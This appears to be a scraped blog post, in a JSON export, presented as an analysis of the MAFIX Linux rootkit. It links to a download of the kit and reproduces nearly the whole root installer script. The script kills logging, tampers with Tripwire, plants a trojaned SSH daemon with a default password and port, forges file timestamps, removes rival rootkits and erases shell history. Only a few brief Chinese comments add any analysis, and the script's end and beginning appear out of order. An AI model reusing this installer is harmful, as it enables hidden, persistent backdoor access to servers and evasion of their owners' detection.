&quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk8 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/src/.puta ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta/*</p><p>&nbsp; &nbsp;mv /usr/src/.puta $HOMEDIR/.owned/tk7</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk7 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/xntpd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/xntpd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/xntpd</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/nscd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/nscd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/nscd</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/include/bex ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz</p><p>&nbsp; &nbsp;chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex/*</p><p>&nbsp; &nbsp;mv /usr/include/bex/ $HOMEDIR/.owned/bex2</p><p>&nbsp; &nbsp;if [ -f /var/log/tcp.log ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa /var/log/tcp.log</p><p>&nbsp; &nbsp; &nbsp; cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} bex2 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /dev/tux/ ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /dev/tux &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;mv /dev/tux $HOMEDIR/.owned/tuxkit</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tuxkit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/bin/ssh2d ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ssh2d</p><p>&nbsp; &nbsp;rm -rf /usr/bin/ssh2d</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/*</p><p>&nbsp; &nbsp;rm -rf /lib/security/.config</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} optickit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/ld.so.hash ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/ld.so.hash</p><p>&nbsp; &nbsp;rm -rf /etc/ld.so.hash</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>chattr +isa /usr/lib/libsh</p><p>chattr +isa /lib/libsh.so</p><p>&nbsp;</p><p># GREPPING SHITZ FROM rc.sysinit and inetd.conf</p><p>&nbsp;</p><p>if [ -f /etc/rc.d/rc.sysinit ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;cat /etc/rc.d/rc.sysinit | grep -v &quot;# Xntps (NTPv3 daemon) startup..&quot;| grep -v &quot;/us\nr/sbin/xntps&quot;| grep -v &quot;/usr/sbin/nscd&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;chmod +x /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/inetd.conf ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/inetd.conf</p><p>&nbsp; &nbsp;cat /etc/inetd.conf | grep -v &quot;6635&quot;| grep -v &quot;9705&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/inted.conf /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/inetd.conf</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p># KILLING SOME LAMME DAEMONS</p><p>&nbsp;</p><p>killall -9 -q nscd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xntps &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mountd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mserv &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q psybnc &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q t0rns &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q linsniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q lpsched &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniff &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sn1f &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xsf &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xchk &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q ssh2d &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} sysinfo:${RES}&quot;</p><p>MYIPADDR=`/sbin/ifconfig eth0 | grep &quot;inet addr:&quot; | awk -F ' ' ' {print $2} ' | cut -c6-`</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; hostname :${CYN} `hostname -f` ($MYIPADDR)${RES}&quot;</p><p>uname -a | awk '{ print &nbsp;$11 }' &gt;/tmp/info_tmp</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; arch: ${CYN}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}&quot;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; alternative ip: ${CYN} &quot;`hostname -i`&quot; -+- &nbsp;Might be [&quot;`/sbin/ifconfig | grep eth | wc -l`&quot; ] active adapters.${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /etc/redhat-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/redhat-release`${RES}&quot;</p><p>elif [ -f /etc/slackware-version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/slackware-version`${RES}&quot;</p><p>elif [ -f /etc/debian_version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/debian_version`${RES}&quot;</p><p>elif [ -f /etc/SuSE-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/SuSE-release`${RES}&quot;</p><p>elif [ -f /etc/issue ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/issue`${RES}&quot;</p><p>else echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} unknown${RES}&quot;</p><p>fi</p><p>echo</p><p>echo -n &quot;${CYN}mafix!${DMAG} &gt; cleaning up some traces... ${RES}&quot;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>if [ -f /.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /.bash_history &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /.bash_history</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/.bash_history</p><p>&nbsp; &nbsp;rm -rf /bin/.bash_history</p><p>fi</p><p>cd $BASEDIR</p><p>rm -rf /tmp/.r*</p><p>cd ..</p><p>rm -rf mafix*</p><p>echo -n &quot;${CYN}done!${RES}&quot;</p><p>echo</p><p>rm -rf /tmp/info_tmp</p><p>endtime=`date +%S`</p><p>echo</p><p>echo</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password: $1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Port: $2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /usr/sbin/syslogd ]; then</p><p>&nbsp; &nbsp;/usr/sbin/syslogd -m 0</p><p>else</p><p>&nbsp; &nbsp;/sbin/syslogd -m 0</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/inetd ]; then</p><p>&nbsp; &nbsp;killall -HUP inetd &gt;/dev/null 2&gt;&amp;1</p><p>elif [ -f /usr/sbin/xinetd ]; then</p><p>&nbsp; &nbsp;killall -HUP xinetd</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p></p>","source":"_posts/MAFIX---Linux-2.6-rootkit分析.md","raw":"title: MAFIX - Linux 2.6 rootkit分析\ncategories: [网络安全]\ntags: []\ndate: 2011-06-28 17:35:00\n---\n<p>MAFIX - Linux 2.6 rootkit</p><p>这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。</p><p>下载地址：</p><p>https://forum.eviloctal.com/attachment.php?aid=13419</p><p>内容：</p><p>MAXFIX</p><p>---HOW-TO</p><p>---mafix</p><p>---mafixlibs &nbsp;</p><p>---root</p><p>&nbsp;</p><p>下面为root的内容，也就是安装脚本。</p><p>#!/bin/bash</p><p>######################</p><p># mafix 0.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p># fud 2009/07/15 &nbsp; &nbsp; #</p><p>######################</p><p>&nbsp;</p><p>BASEDIR=`pwd`</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>BLK=' [1;30m'</p><p>MAG=' [1;35m'</p><p>CYN=' [1;30m'</p><p>RED='^[[1;32m'</p><p>DMAG=' [1;37m'</p><p>RES=' [0m'</p><p>&nbsp;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG}- the ferrari of rootkits - ${RES}&quot;</p><p>sleep 5</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} extracting libs...${RES}&quot;</p><p>tar zxf mafixlibs</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} you need to be root to backdoor the box...${RES}&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>cd $BASEDIR</p><p>sleep 1</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>startime=`date +%S`</p><p>&nbsp;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdooring box...${RES}&quot;</p><p>SYSLOGCONF=&quot;/etc/syslog.conf&quot;</p><p>REMOTE=`grep -v &quot;^#&quot; &quot;$SYSLOGCONF&quot; | grep -v &quot;^$&quot; | grep &quot;@&quot; | cut -d '@' -f 2`</p><p>if [ ! -z &quot;$REMOTE&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Remote logging found! I hope you got access to these box:${RES}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for host in $REMOTE; do</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo -n &quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $host</p><p>&nbsp; &nbsp; &nbsp; &nbsp; done</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo ' ${CYN}coz this box is logging to it${RES}'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no remote logging found...${RES}&quot;</p><p>fi</p><p>uname=`uname -n`</p><p>twd=/var/lib/tripwire/$uname.twd</p><p>if [ -d /etc/tripwire ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WARNING: TRIPWIRE FOUND!${RES}&quot;</p><p>if [ -f /var/lib/tripwire/$uname.twd ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa $twd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#去保护，如果有的话，覆盖，chattr +isa 写保护</p><p>&nbsp; &nbsp;else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire db found...${RES}&quot;</p><p>&nbsp; &nbsp;fi</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire was detected..${RES}&quot;</p><p>fi</p><p># restoring login</p><p>if [ -f /sbin/xlogin ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/xlogin</p><p>&nbsp; &nbsp;chattr -isa /bin/login</p><p>&nbsp; &nbsp;mv -f /sbin/xlogin /bin/login</p><p>&nbsp; &nbsp;chmod 7455 /bin/login</p><p>&nbsp; &nbsp;chattr +isa /bin/login</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} installing trojans...${RES}&quot;</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; chattr -isa /etc/sh.conf</p><p>&nbsp; rm -rf /etc/sh.conf</p><p>fi</p><p># checking if we got needed libs and filez</p><p>if [ ! -f /lib/libproc.a ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.a /lib/ 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ ! -f /lib/libproc.so.2.0.6 ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.so.2.0.6 /lib/ 2&gt;/dev/null</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} hold on...${RES}&quot;</p><p>/sbin/ldconfig &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>if [ ! -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;touch -acmr /bin/ls bin/md5sum</p><p>&nbsp; &nbsp;cp bin/md5sum /usr/bin/md5sum</p><p>fi</p><p>DEFPASS=race</p><p>DEFPORT=11111</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $1${RES}&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#生成密码文件</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPASS${RES}&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>chattr +isa /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#写保护</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Port:${DMAG} $2${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPORT${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $B\nASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ -f /lib/lidps1.so ]; then</p><p>&nbsp; chattr -isa /lib/lidps1.so</p><p>&nbsp; rm -rf /lib/lidps1.so</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/hosts.h ]; then</p><p>&nbsp; chattr -isa /usr/include/hosts.h</p><p>&nbsp; rm -rf /usr/include/hosts.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/file.h ]; then</p><p>&nbsp; chattr -isa /usr/include/file.h</p><p>&nbsp; rm -rf /usr/include/file.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/log.h ]; then</p><p>&nbsp; chattr -isa /usr/include/log.h</p><p>&nbsp; rm -rf /usr/include/log.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/proc.h ]; then</p><p>&nbsp; chattr -isa /usr/include/proc.h</p><p>&nbsp; rm -rf /usr/include/proc.h</p><p>fi</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>mv $BASEDIR/bin/headers/lidps1.so /lib/lidps1.so 2&gt;/dev/null</p><p>touch -acmr /bin/ls /lib/lidps1.so &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #修改文件时间与/bin/ls 时间相同</p><p>touch -acmr /bin/ls $BASEDIR/bin/headers/* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#修改时间</p><p>mv $BASEDIR/bin/headers/* &nbsp;/usr/include/ 2&gt;/dev/null</p><p>&nbsp;</p><p># Ok lets start creating dirs</p><p>&nbsp;</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so/*</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh/*</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/ 2&gt;/dev/null</p><p>mv .sh/.bashrc $HOMEDIR 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/ttymon</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload 